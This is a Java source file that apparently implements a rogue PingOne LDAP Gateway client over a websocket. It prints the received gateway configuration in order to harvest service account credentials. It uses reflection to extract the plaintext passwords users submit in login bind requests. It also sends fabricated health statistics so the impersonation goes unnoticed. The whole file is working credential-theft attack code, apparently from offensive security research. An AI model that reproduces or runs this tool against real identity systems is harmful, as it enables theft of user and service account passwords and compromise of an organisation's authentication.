package com.xpnsec.cloudnine;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.pingidentity.lightning.ldapaccess.core.LdapGatewayConfig;
import com.pingidentity.lightning.ldapaccess.core.outbound.*;
import com.pingidentity.lightning.ldapaccess.core.inbound.*;
import com.pingidentity.lightning.sdk.gateway.protocols.outbound.*;
import com.unboundid.ldap.sdk.*;
import javax.websocket.Session;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class PingTools {

    private final ObjectMapper mapper;
    private final Session session;

    public PingTools(Session session) {
        this.mapper = (new ObjectMapper()).disable(SerializationFeature.FAIL_ON_EMPTY_BEANS);
        this.session = session;
    }

    private void handleConfigMessage(JsonNode data) {
        LdapGatewayConfig val = null;

        try {
            val = mapper.treeToValue(data, LdapGatewayConfig.class);
        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }

        var ldapConnectionDetails = val.getLdapConnectionDetailsJSONSpecification();

        System.out.println("[*] Configuration Response Dump (check for service account creds)");
        System.out.println(ldapConnectionDetails);
        System.out.println(" ");

        // Send a status message back
        Map<String, Object> registeredStats = new HashMap<>();
        Map<String, Object> incomingMessageProcessingStats = new HashMap<>();

        registeredStats.put("ActiveWebsocketSessions", 2);
        registeredStats.put("ClosedWebsocketSessions", 0);
        registeredStats.put("ConnectedRegions", 2);
        registeredStats.put("ErrorCount", 0);
        registeredStats.put("ErrorCountIncomingMessage", 0);
        registeredStats.put("ErrorCountIncomingMessageConfigUpdatedFailed", 0);
        registeredStats.put("ErrorCountIncomingMessageDroppedMessagesQueueFull", 0);
        registeredStats.put("ErrorCountIncomingMessageDroppedQueueFull", 0);
        registeredStats.put("ErrorCountIncomingMessageProcessingError", 0);
        registeredStats.put("ErrorCountLDAP", 0);
        registeredStats.put("ErrorCountLDAPAuthenticationExceptions", 0);
        registeredStats.put("ErrorCountLDAPConnectionConfigurationExceptions", 0);
        registeredStats.put("ErrorCountLDAPProvisioningSyncExceptions", 0);
        registeredStats.put("ErrorCountLDAPRawRequestExceptions", 0);
        registeredStats.put("ErrorCountLDAPSearchExceptions", 0);
        registeredStats.put("ErrorCountOutgoingMessage", 0);
        registeredStats.put("ErrorCountOutgoingMessageFailedToSend", 0);
        registeredStats.put("ErrorCountOutgoingMessageFailedToSendNoPoolForRegion", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrors", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsIncomingMessageInvalidMessage", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsIncomingMessageJsonParsingError", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsInitializeResponseNotReceivedFirst", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsLogMessageHasNoStackTrace", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsLoggerUsageCountNotRetrievable", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsMessageFragmenterBzip2CompressError", 0);
        registeredStats.put("ErrorCountShouldNeverHappenErrorsMessageFragmenterBzip2UnompressError", 0);
        registeredStats.put("ErrorCountWebsocket", 0);
        registeredStats.put("ErrorCountWebsocketInitializationErrors", 0);
        registeredStats.put("ErrorCountWebsocketOnError", 0);
        registeredStats.put("GcCollectionCount", 0);
        registeredStats.put("GcCollectionTotalMillis", 0);
        registeredStats.put("GcG1OldGenerationCollectionCount", 0);
        registeredStats.put("GcG1OldGenerationCollectionTotalMillis", 0);
        registeredStats.put("GcG1YoungGenerationCollectionCount", 0);
        registeredStats.put("GcG1YoungGenerationCollectionTotalMillis", 0);
        registeredStats.put("HeapCommittedMB", 250);
        registeredStats.put("HeapFreeMB", 153);
        registeredStats.put("HeapPercentFull", 39);
        registeredStats.put("HeapUsedMB", 97);
        registeredStats.put("IntervalDurationMillis", 245);
        registeredStats.put("LDAPAuthenticationFailed", 0);
        registeredStats.put("LDAPAuthenticationSearchMatchedMultipleUsers", 0);
        registeredStats.put("LDAPAuthenticationSearchMatchedZeroUsers", 0);
        registeredStats.put("LDAPAuthenticationSucceeded", 0);
        registeredStats.put("LDAPRawRequestSucceeded", 0);
        registeredStats.put("LiveDataHeapMB", 0);
        registeredStats.put("LiveDataHeapPercentFull", 39);
        registeredStats.put("LoggerUsageLimitExceeded", 0);
        registeredStats.put("MemPoolCodeHeapNonNmethodsCommittedBytes", 3145728);
        registeredStats.put("MemPoolCodeHeapNonNmethodsPercentFull", 97);
        registeredStats.put("MemPoolCodeHeapNonNmethodsType", "Non-heap memory");
        registeredStats.put("MemPoolCodeHeapNonNmethodsUsedBytes", 3062528);
        registeredStats.put("MemPoolCodeHeapNonProfiledNmethodsCommittedBytes", 2949120);
        registeredStats.put("MemPoolCodeHeapNonProfiledNmethodsPercentFull", 98);
        registeredStats.put("MemPoolCodeHeapNonProfiledNmethodsUsedBytes", "Non-heap memory");
        registeredStats.put("MemPoolCodeHeapNonProfiledNmethodsType", 2887040);
        registeredStats.put("MemPoolCodeHeapProfiledNmethodsCommittedBytes", 11534336);
        registeredStats.put("MemPoolCodeHeapProfiledNmethodsPercentFull", 100);
        registeredStats.put("MemPoolCodeHeapProfiledNmethodsType", "Non-heap memory");
        registeredStats.put("MemPoolCodeHeapProfiledNmethodsUsedBytes", 11490432);
        registeredStats.put("MemPoolCompressedClassSpaceCommittedBytes", 6422528);
        registeredStats.put("MemPoolCompressedClassSpacePercentFull", 91);
        registeredStats.put("MemPoolCompressedClassSpaceType", "Non-heap memory");
        registeredStats.put("MemPoolCompressedClassSpaceUsedBytes", 5829208);
        registeredStats.put("MemPoolG1EdenSpaceCommittedBytes", 154140672);
        registeredStats.put("MemPoolG1EdenSpacePercentFull", 59);
        registeredStats.put("MemPoolG1EdenSpaceType", "Heap memory");
        registeredStats.put("MemPoolG1EdenSpaceUsedBytes", 90177536);
        registeredStats.put("MemPoolG1OldGenCommittedBytes", 96468992);
        registeredStats.put("MemPoolG1OldGenPercentFull", 0);
        registeredStats.put("MemPoolG1OldGenType", "Heap memory");
        registeredStats.put("MemPoolG1OldGenUsedBytes", 0);
        registeredStats.put("MemPoolG1SurvivorSpaceAfterLastCollectionCommitedBytes", 11534336);
        registeredStats.put("MemPoolG1SurvivorSpaceAfterLastCollectionPercentFull", 100);
        registeredStats.put("MemPoolG1SurvivorSpaceAfterLastCollectionUsedBytes", 11534336);
        registeredStats.put("MemPoolG1SurvivorSpaceCommittedBytes", 11534336);
        registeredStats.put("MemPoolG1SurvivorSpacePercentFull", 100);
        registeredStats.put("MemPoolG1SurvivorSpaceType", "Heap memory");
        registeredStats.put("MemPoolG1SurvivorSpaceUsedBytes", 11534336);
        registeredStats.put("MemPoolMetaspaceCommittedBytes", 52248576);
        registeredStats.put("MemPoolMetaspacePercentFull", 97);
        registeredStats.put("MemPoolMetaspaceType", "Non-heap memory");
        registeredStats.put("MemPoolMetaspaceUsedBytes", 50834192);
        registeredStats.put("NewWebsocketSessions", 1);
        registeredStats.put("NonHeapCommittedMB", 73);
        registeredStats.put("NonHeapUsedMB", 71);
        registeredStats.put("NumThreads", 89);
        registeredStats.put("NumWebsocketConnections", 1);
        registeredStats.put("OutgoingMessageDelayedByThrottle", 0);
        registeredStats.put("OutgoingMessageDroppedLogMessages", 0);
        registeredStats.put("OutgoingMessageErrorLogMessages", 0);
        registeredStats.put("OutgoingMessageFragmentedMessages", 0);
        registeredStats.put("OutgoingMessageWarningLogMessages", 1);
        registeredStats.put("PercentTimeInGc", 0);
        registeredStats.put("ProvisioningSyncFailures", 0);
        registeredStats.put("ProvisioningSyncSuccesses", 0);
        registeredStats.put("RegisteredJsrSessionBeans", 0);
        registeredStats.put("StatCalculationDurationMillis", 0);
        registeredStats.put("UptimeMillis", 0);

        long startTimeMillis = System.currentTimeMillis();
        incomingMessageProcessingStats.put("startTime", startTimeMillis);
        incomingMessageProcessingStats.put("endTime", startTimeMillis);
        incomingMessageProcessingStats.put("totalProcessed", 0);
        incomingMessageProcessingStats.put("totalProcessingTimeMillis", 0.0);
        incomingMessageProcessingStats.put("averageProcessingTimeMillis", 0.0);
        incomingMessageProcessingStats.put("maxProcessingTimeMillis", 0.0);
        incomingMessageProcessingStats.put("averageThreadPercentBusy", 0.0);
        incomingMessageProcessingStats.put("maxThreadPercentBusy", 0.0);
        incomingMessageProcessingStats.put("averageCPUPercentBusy", 0.0);
        incomingMessageProcessingStats.put("maxCPUPercentBusy", 0.0);

        StatusUpdateMessage status = new StatusUpdateMessage();
        StatusUpdateMessageData statusData = new StatusUpdateMessageData();
        statusData.setGatewayInstanceStat("registeredStats", registeredStats);
        statusData.setGatewayInstanceStat("incomingMessageProcessingStats", incomingMessageProcessingStats);
        statusData.setGatewayInstanceStat("health", "HEALTHY");
        statusData.setGatewayInstanceStat("unavailableDetails", null);
        status.setData(statusData);

        JsonNode mappedJson = mapper.valueToTree(status);

        try {
            this.session.getBasicRemote().sendText(mappedJson.toString());
        } catch (Exception e) {
            System.out.println("[!] ERROR: " + e.getMessage());
        }
    }

    private void handleRawLDAPSearch(JsonNode data) {

        try {

            RawLdapSearchesThenOpRequestMessage val = mapper.treeToValue(data, RawLdapSearchesThenOpRequestMessage.class);
            var c = val.getData().getSearchRequests();
            var d = val.getData().getPostSearchRequest();
            Field password = SimpleBindRequest.class.getDeclaredField("password");
            password.setAccessible(true);

            System.out.println("Username Filter: " + c[0].getFilter().toString());
            System.out.println("Password: " + password.get(d));

            var searchResults = new ArrayList<SearchResultEntry>();
            JsonNode mappedJson;

            BindResult ldapResult = new BindResult(-1, ResultCode.INVALID_CREDENTIALS, null, null, null, null);

            SearchResult ldapSearchResult = new SearchResult(0, ResultCode.INVALID_CREDENTIALS, null, null, null, null, null, 0, 0, new Control[]{});
            RawLdapSearchesThenOpResponseMessage response = RawLdapSearchesThenOpResponseMessage.with(val.getCallbackUrl(), val.getRequestId(), new SearchResult[]{}, ldapResult);

            mappedJson = mapper.valueToTree(response);

            try {
                this.session.getBasicRemote().sendText(mappedJson.toString());
            } catch (Exception e) {
                System.out.println("[!] ERROR: " + e.getMessage());
            }

        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public void HandleIncomingMessage(String jsonMessage) {
        ObjectNode json = null;
        String messageType;

        try {
            json = (ObjectNode) mapper.readTree(jsonMessage);
            messageType = json.get("messageType").asText();

            switch (messageType) {
                case "configuration":
                    handleConfigMessage(json.get("data"));
                    break;
                case "rawLdapSearchesThenOpRequest":
                    handleRawLDAPSearch(json);
                    break;
                default:
                    break;
            }
        } catch (JsonProcessingException e) {
            System.out.println("[!] Error parsing JSON: " + e.getMessage());
        }
    }
}
